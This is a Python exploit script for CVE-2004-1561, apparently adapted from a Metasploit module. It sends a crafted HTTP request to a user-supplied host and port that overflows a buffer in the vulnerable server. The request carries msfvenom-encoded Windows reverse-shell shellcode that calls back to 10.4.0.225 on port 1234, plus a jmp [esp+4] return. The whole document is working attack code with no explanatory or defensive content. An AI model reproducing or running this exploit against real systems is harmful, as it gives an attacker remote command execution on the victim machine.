#CVE-2004-1561
#Derived from metasploit module

import sys
import socket

#usage python ice.py <rhost> <rport>
rhost = sys.argv[1]
rport = int(sys.argv[2])

#msfvenom -p windows/shell_reverse_tcp LHOST=10.4.0.225 LPORT=1234 -e x86/shikata_ga_nai -b '\x0d\x0a\x00' -s 2000 -f python
buf =  ""
buf += "\xbd\x38\xdf\xbc\xb6\xdb\xc2\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x6a\x0e\x03\x52\xd1\x5e"
buf += "\x43\x5e\x05\x1c\xac\x9e\xd6\x41\x24\x7b\xe7\x41\x52"
buf += "\x08\x58\x72\x10\x5c\x55\xf9\x74\x74\xee\x8f\x50\x7b"
buf += "\x47\x25\x87\xb2\x58\x16\xfb\xd5\xda\x65\x28\x35\xe2"
buf += "\xa5\x3d\x34\x23\xdb\xcc\x64\xfc\x97\x63\x98\x89\xe2"
buf += "\xbf\x13\xc1\xe3\xc7\xc0\x92\x02\xe9\x57\xa8\x5c\x29"
buf += "\x56\x7d\xd5\x60\x40\x62\xd0\x3b\xfb\x50\xae\xbd\x2d"
buf += "\xa9\x4f\x11\x10\x05\xa2\x6b\x55\xa2\x5d\x1e\xaf\xd0"
buf += "\xe0\x19\x74\xaa\x3e\xaf\x6e\x0c\xb4\x17\x4a\xac\x19"
buf += "\xc1\x19\xa2\xd6\x85\x45\xa7\xe9\x4a\xfe\xd3\x62\x6d"
buf += "\xd0\x55\x30\x4a\xf4\x3e\xe2\xf3\xad\x9a\x45\x0b\xad"
buf += "\x44\x39\xa9\xa6\x69\x2e\xc0\xe5\xe5\x83\xe9\x15\xf6"
buf += "\x8b\x7a\x66\xc4\x14\xd1\xe0\x64\xdc\xff\xf7\x8b\xf7"
buf += "\xb8\x67\x72\xf8\xb8\xae\xb1\xac\xe8\xd8\x10\xcd\x62"
buf += "\x18\x9c\x18\x24\x48\x32\xf3\x85\x38\xf2\xa3\x6d\x52"
buf += "\xfd\x9c\x8e\x5d\xd7\xb4\x25\xa4\xb0\xb0\xbd\xa6\xa1"
buf += "\xad\xbf\xa6\x25\xfc\x49\x40\x4f\x10\x1c\xdb\xf8\x89"
buf += "\x05\x97\x99\x56\x90\xd2\x9a\xdd\x17\x23\x54\x16\x5d"
buf += "\x37\x01\xd6\x28\x65\x84\xe9\x86\x01\x4a\x7b\x4d\xd1"
buf += "\x05\x60\xda\x86\x42\x56\x13\x42\x7f\xc1\x8d\x70\x82"
buf += "\x97\xf6\x30\x59\x64\xf8\xb9\x2c\xd0\xde\xa9\xe8\xd9"
buf += "\x5a\x9d\xa4\x8f\x34\x4b\x03\x66\xf7\x25\xdd\xd5\x51"
buf += "\xa1\x98\x15\x62\xb7\xa4\x73\x14\x57\x14\x2a\x61\x68"
buf += "\x99\xba\x65\x11\xc7\x5a\x89\xc8\x43\x6a\xc0\x50\xe5"
buf += "\xe3\x8d\x01\xb7\x69\x2e\xfc\xf4\x97\xad\xf4\x84\x63"
buf += "\xad\x7d\x80\x28\x69\x6e\xf8\x21\x1c\x90\xaf\x42\x35"
evul = "\xeb\x0c / HTTP/1.1 "
evul += buf
evul += "\r\n"
evul += "Accept: text/html\r\n" * 31;

# jmp [esp+4]
evul += "\xff\x64\x24\x04\r\n"
evul += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))
s.sendall(evul)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
